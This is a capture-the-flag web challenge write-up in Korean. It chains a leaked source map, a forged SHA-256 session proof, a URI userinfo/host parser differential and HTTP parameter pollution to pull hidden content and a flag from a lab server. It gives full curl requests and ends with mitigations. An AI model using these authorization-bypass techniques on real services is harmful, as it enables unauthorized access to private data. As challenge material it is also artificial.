## 문제 정보

- 분야: Web
- 대상: `http://52.79.35.14:43207/`
- 목표: 이전 프리뷰 환경에 남아 있는 자료에서 복구 코드 획득

## 최종 플래그

```text

```

## 공격 흐름 요약

이 문제는 하나의 단순한 취약점이 아니라 여러 정보 노출과 파서 불일치를 연결해야 하는 문제였다.

1. HTML에서 배포 릴리스 식별자 확인
2. 공개된 JavaScript 소스맵에서 폐기된 세션 교환 로직 복구
3. SHA-256 proof를 생성하여 `archive-viewer` 토큰 발급
4. 아카이브 작업 로그에서 이전 환경의 ledger fragment 수집
5. fragment를 정규화하고 hash chain을 계산해 ledger binding 복구
6. 실패한 PDF export의 retry 기능에서 URI userinfo/host 파싱 불일치 악용
7. 숨겨진 이전 환경 자료를 staged export로 생성
8. transfer journal의 masked fragment를 복호화해 실제 콘텐츠 주소 계산
9. `ref` 중복 파라미터를 이용한 HTTP Parameter Pollution으로 권한 검증 우회
10. gzip 콘텐츠에서 플래그 획득

## 1. 공개 페이지 조사

메인 페이지 응답의 `<html>` 요소에는 다음과 같은 릴리스 표식이 있었다.

```html
<html lang="ko" data-release="lumen-web-2026.09.21-r7">
```

또한 헤더에는 레거시 호환성 표식이 존재했다.

```html
data-navigation-compat="lumen-navigation-compat/2.4"
```

페이지에 포함된 JavaScript 청크를 확인하던 중 다음 소스맵이 그대로 공개되어 있었다.

```text
/_next/static/chunks/0pbnrs7b4g_e-.js.map
```

## 2. 소스맵에서 폐기된 인증 로직 발견

소스맵의 `sourcesContent`에는 다음 파일들이 포함되어 있었다.

```text
src/legacy/session-profile.json
src/legacy/session-proof.ts
src/legacy/preview-client.ts
src/legacy/rollback-notes.ts
```

세션 프로필은 다음과 같았다.

```json
{
  "clientId": "retired-navigation-preview",
  "audience": "archive-readonly",
  "proofLabel": "lumen-archive-session/3",
  "keyHint": "rollback-window:nav-2026q3"
}
```

proof 생성 로직도 소스맵에 완전히 노출되어 있었다.

```ts
const input = [
  profile.proofLabel,
  release,
  profile.clientId,
  profile.audience,
  profile.keyHint,
].join('\n');

const value = await crypto.subtle.digest(
  'SHA-256',
  new TextEncoder().encode(input),
);

return `las_${toHex(new Uint8Array(value)).slice(7, 39)}`;
```

따라서 다음 문자열을 LF로 연결한 뒤 SHA-256 해시의 8번째 문자부터 32글자를 사용하면 된다.

```text
lumen-archive-session/3
lumen-web-2026.09.21-r7
retired-navigation-preview
archive-readonly
rollback-window:nav-2026q3
```

계산 결과는 다음과 같다.

```text
las_55f12c1eb44e5ce287076544137f9629
```

세션 교환 요청은 다음과 같다.

```bash
curl -X POST 'http://52.79.35.14:43207/api/archive/session/exchange' \
  -H 'Content-Type: application/json' \
  -H 'X-Lumen-Archive-Proof: las_55f12c1eb44e5ce287076544137f9629' \
  --data '{
    "clientId":"retired-navigation-preview",
    "audience":"archive-readonly",
    "release":"lumen-web-2026.09.21-r7"
  }'
```

응답으로 `archive-viewer` 권한의 Bearer 토큰과 API 주소가 반환되었다.

```json
{
  "tokenType": "Bearer",
  "accessToken": "lumen_at_...",
  "expiresIn": 900,
  "api": "/api/archive/v1",
  "identity": {
    "role": "archive-viewer",
    "workspace": "web-public"
  }
}
```

이후 요청에서는 이 토큰을 다음과 같이 사용한다.

```bash
AUTH='Authorization: Bearer lumen_at_...'
```

## 3. API 탐색과 정상 공개 export 생성

API 루트에서 HATEOAS 링크를 확인할 수 있었다.

```bash
curl -H "$AUTH" 'http://52.79.35.14:43207/api/archive/v1/'
```

주요 링크는 다음과 같았다.

```text
/api/archive/v1/workspaces/current
/api/archive/v1/catalog
```

카탈로그에는 정상 공개 자료 하나가 존재했다.

```text
artifactId = art_web_navigation_copy
revisionId = rev_public_r7
profile    = static-html 또는 pdf-proof
```

먼저 `static-html` export를 만들고 commit했다. 이 export는 이후 정상 콘텐츠용 baseline과 delivery grant를 얻는 데 사용한다.

```bash
curl -X POST 'http://52.79.35.14:43207/api/archive/v1/exports' \
  -H "$AUTH" \
  -H 'Content-Type: application/json' \
  --data '{
    "artifactId":"art_web_navigation_copy",
    "revisionId":"rev_public_r7",
    "profile":"static-html",
    "label":"audit"
  }'
```

응답의 export ID, ETag, integrity 값을 이용해 commit한다.

```bash
curl -X POST \
  -H "$AUTH" \
  -H 'If-Match: "응답의 ETag"' \
  -H 'X-Lumen-Job-Integrity: 응답의 integrity' \
  'http://52.79.35.14:43207/api/archive/v1/exports/<PUBLIC_EXPORT_ID>/commit'
```

정상 공개 export의 콘텐츠 주소는 다음 값이었다.

```text
sha256:f8945c09dadb6f4fefb7eb8662bccb2ad10155133e15a776c589072eb0aec118
```

## 4. 이전 환경의 ledger fragment 수집

현재 workspace 정보에서 `operations?cursor=head` 링크를 얻을 수 있었다. 페이지의 `next` 링크를 끝까지 따라가면 두 개의 ledger에 속한 fragment가 섞여서 반환된다.

```text
ldg_81cc72e4
  0: authority = wsp_32e8bf0c
  1: subject   = art_7ae91c44
  2: revision  = rev_a1f0d927
  3: renderer  = rnd_34bc012e

ldg_c2601af9
  0: authority = wsp_b6f4103d
  1: subject   = art_44d9016a
  2: revision  = rev_27f8ee10
  3: renderer  = rnd_b813e252
```

특히 작업 로그에는 다음 이벤트가 있었다.

```json
{
  "event": "retry.binding.quarantined",
  "ledger": "ldg_81cc72e4",
  "incident": "inc_a14f380d"
}
```

이는 첫 번째 ledger가 문제에서 요구하는 정리되지 않은 이전 자료와 연결되어 있음을 암시한다.

## 5. Ledger binding 복구

정상 `pdf-proof` export를 commit하면 렌더러 검증 실패가 발생하며 receipt와 retry 기능이 열린다. receipt의 링크를 통해 다음 포맷 문서를 찾을 수 있었다.

```text
/api/archive/v1/formats/ledger-binding-2
```

binding 계산 규칙은 다음과 같다.

1. 각 record 객체의 키를 재귀적으로 정렬한다.
2. 공백 없는 Compact JSON으로 직렬화한다.
3. 초기 checkpoint는 ASCII 문자 `0` 64개이다.
4. 각 fragment를 ordinal 순서로 처리한다.
5. `SHA-256(previous + "\n" + serialized_record)`를 계산한다.
6. 마지막 checkpoint 앞에 `lgb_`를 붙인다.

첫 번째 ledger를 계산하면 중간 checkpoint가 로그의 `previous` 값과 정확히 일치한다.

```text
ordinal 0 -> 405db6e04c88b016d1f0a55985e63703c6ab2e5cb59b4c256d6dfd17b264f226
ordinal 1 -> 50503a556a0df46d8fca13807f6f49db615fcc4561fe6a188ef3c82f805e523b
ordinal 2 -> cf1691a29e0cc18bf0eadbcca386a1e01fd46f6a9b07afdbbbe774546b802d60
ordinal 3 -> 028d115ebff18eebd1948fff193aca422bf19643aead84e85f3a863bcf51efc7
```

따라서 필요한 binding은 다음과 같다.

```text
lgb_028d115ebff18eebd1948fff193aca422bf19643aead84e85f3a863bcf51efc7
```

## 6. URI userinfo/host 파싱 불일치 악용

실패한 PDF export에는 다음 retry 입력이 제공된다.

```json
{
  "lineageUri": "lumen-artifact URI",
  "ledgerBinding": "lgb_<64 hex>",
  "mode": "reuse-validation"
}
```

일반적으로 이전 workspace를 authority로 사용하면 접근이 거부된다.

```text
lumen-artifact://wsp_32e8bf0c/...
```

하지만 authority에 URL userinfo 문법을 적용하면 접근 검사와 실제 객체 조회가 서로 다른 값을 사용한다.

```text
lumen-artifact://web-public@wsp_32e8bf0c/art_7ae91c44?revision=rev_a1f0d927&profile=rnd_34bc012e
```

- 접근 검사: userinfo인 `web-public`을 현재 workspace로 인식
- 객체 조회: host인 `wsp_32e8bf0c`에서 이전 자료 조회

즉 동일 URI를 서로 다른 방식으로 파싱하는 parser differential 취약점이다.

다음과 같이 첫 번째 ledger binding을 사용해 retry한다.

```bash
curl -X POST \
  -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -H 'If-Match: "실패한 PDF export의 ETag"' \
  -H 'X-Lumen-Job-Integrity: 실패한 PDF export의 integrity' \
  'http://52.79.35.14:43207/api/archive/v1/exports/<FAILED_EXPORT_ID>/retry' \
  --data '{
    "lineageUri":"lumen-artifact://web-public@wsp_32e8bf0c/art_7ae91c44?revision=rev_a1f0d927&profile=rnd_34bc012e",
    "ledgerBinding":"lgb_028d115ebff18eebd1948fff193aca422bf19643aead84e85f3a863bcf51efc7",
    "mode":"reuse-validation"
  }'
```

생성된 retry export를 commit하면 첫 번째 ledger는 `ready` 상태가 된다. 반면 두 번째 ledger는 다시 renderer validation에 실패하므로 첫 번째 ledger가 올바른 대상임을 확인할 수 있다.

## 7. Transfer journal에서 숨겨진 콘텐츠 주소 계산

숨겨진 export의 result는 직접 주소 대신 staged checkpoint를 반환했다.

```text
dcp_762b12eb0e9e216b58d7f8a011fc1a525f21c8dc4ade76157e3b7a016706f49b
```

또한 다음 링크가 제공되었다.

```text
/api/archive/v1/delivery-journal?cursor=head
/api/archive/v1/formats/transfer-journal-1
```

포맷 문서에 따르면 콘텐츠 digest는 두 개의 masked fragment로 분할되어 있다.

각 fragment에 대해 다음 mask를 계산한다.

```text
SHA-256("lumen-transfer-mask/1\n" + ledger_binding + "\n" + ordinal)
```

그 후 다음 연산을 수행한다.

```text
share[ordinal] = base64url_decode(fragment) XOR mask
address        = share[0] XOR share[1]
```

마지막으로 다음 checkpoint를 계산해 staged checkpoint와 비교한다.

```text
dcp_ + SHA-256("lumen-transfer/1\n" + ledger_binding + "\n" + address_hex)
```

모든 stream을 대입한 결과 `tr_620cb5a1`만 staged checkpoint와 일치했다.

복구된 실제 콘텐츠 주소는 다음과 같다.

```text
sha256:6cc55653bb2a5586bc8782fcf7c61de82331d259ec9ac211e739a8ca838cabbf
```

## 8. Delivery grant 생성

`content/resolve`는 승인된 delivery grant를 요구한다. 정상 공개 export를 baseline과 candidate 양쪽에 지정하여 review를 만들고 승인하면 session-bound grant를 얻을 수 있다.

```bash
curl -X POST \
  -H "$AUTH" \
  -H 'Content-Type: application/json' \
  'http://52.79.35.14:43207/api/archive/v1/delivery-reviews' \
  --data '{
    "baselineExportId":"<PUBLIC_EXPORT_ID>",
    "candidateExportId":"<PUBLIC_EXPORT_ID>"
  }'
```

응답의 review ID와 ETag로 approve한다.

```bash
curl -X POST \
  -H "$AUTH" \
  -H 'If-Match: "review ETag"' \
  'http://52.79.35.14:43207/api/archive/v1/delivery-reviews/<REVIEW_ID>/approve'
```

응답의 `grant` 값을 이후 `X-Lumen-Delivery-Grant` 헤더로 사용한다.

숨겨진 export를 직접 candidate로 지정하면 다음 오류가 발생한다.

```text
Candidate is outside the baseline workspace.
```

따라서 마지막 검증 우회가 한 번 더 필요하다.

## 9. 중복 `ref` 파라미터를 이용한 HPP

콘텐츠 resolver의 포맷 문서에는 `ref`의 cardinality가 1이라고 적혀 있었지만, 실제 서버는 중복 파라미터를 거부하지 않았다.

정상 공개 주소를 첫 번째 `ref`, 숨겨진 주소를 두 번째 `ref`로 전달하면 다음과 같은 검증/조회 불일치가 발생한다.

- 권한 검증: 첫 번째 `ref`인 정상 공개 주소 사용
- 실제 콘텐츠 조회: 마지막 `ref`인 숨겨진 주소 사용

최종 요청의 형태는 다음과 같다.

```bash
curl \
  -H "$AUTH" \
  -H 'X-Lumen-Delivery-Grant: <PUBLIC_DELIVERY_GRANT>' \
  'http://52.79.35.14:43207/api/archive/v1/content/resolve?ref=sha256%3Af8945c09dadb6f4fefb7eb8662bccb2ad10155133e15a776c589072eb0aec118&ref=sha256%3A6cc55653bb2a5586bc8782fcf7c61de82331d259ec9ac211e739a8ca838cabbf&export=<PUBLIC_EXPORT_ID>' \
  -o hidden.gz

gzip -dc hidden.gz
```

응답을 압축 해제하면 다음 JSON이 나온다.

```json
{
  "workspace": "release-engineering",
  "artifact": "release-notes",
  "revision": "2026.09-r7-final",
  "classification": "internal-release",
  "recoveryMarker": "flag{073f9cc3f44fb3f7bc7b72d243230b0374a9651092488ddbd1e2acbb7e019326}"
}
```

## 취약점 정리

### 1. 프로덕션 소스맵 노출

폐기된 인증 프로필, API 경로, proof 생성 알고리즘이 `sourcesContent`에 포함되어 있었다.

### 2. 클라이언트 계산값만 신뢰하는 레거시 인증

서버 비밀값 없이 공개된 릴리스 정보와 정적 문자열만으로 archive 세션 proof를 생성할 수 있었다.

### 3. 민감한 migration audit log 노출

읽기 권한만으로 이전 workspace의 authority, artifact, revision, renderer 식별자와 hash-chain 입력 전체를 얻을 수 있었다.

### 4. URI parser differential

`userinfo@host` 형식에서 접근 제어와 객체 조회가 서로 다른 authority 값을 사용했다. 그 결과 `web-public` 권한으로 이전 workspace의 객체를 retry할 수 있었다.

### 5. Transfer journal 정보 노출

ledger binding과 journal fragment만으로 staged 콘텐츠의 SHA-256 주소를 완전히 복구할 수 있었다.

### 6. HTTP Parameter Pollution

`ref` 파라미터가 하나여야 한다는 명세와 달리 중복 값을 허용했으며, 권한 검사와 실제 조회 단계가 서로 다른 원소를 사용했다. 공개 콘텐츠용 grant로 내부 콘텐츠를 내려받을 수 있었던 최종 원인이다.

## 대응 방안

- 프로덕션 배포에서 `sourcesContent`가 포함된 소스맵을 제거하거나 접근을 제한한다.
- 인증 proof는 공개 정보의 단순 해시가 아니라 서버 비밀키 기반 MAC 또는 서명으로 검증한다.
- 폐기된 세션 교환 엔드포인트는 rollback 기간 종료 즉시 제거한다.
- 모든 계층에서 하나의 URI 파서와 정규화 결과만 사용한다.
- URI의 userinfo를 허용하지 않거나 명시적으로 거부한다.
- ledger fragment와 내부 객체 식별자를 최소 권한 원칙에 따라 필터링한다.
- query parameter cardinality를 라우팅 진입점에서 강제하고 중복 키를 즉시 거부한다.
- 권한 검증에 사용한 정규화된 콘텐츠 주소와 실제 조회 주소가 완전히 동일한지 비교한다.
- delivery grant는 export ID뿐 아니라 최종 canonical content digest에도 강하게 바인딩한다.
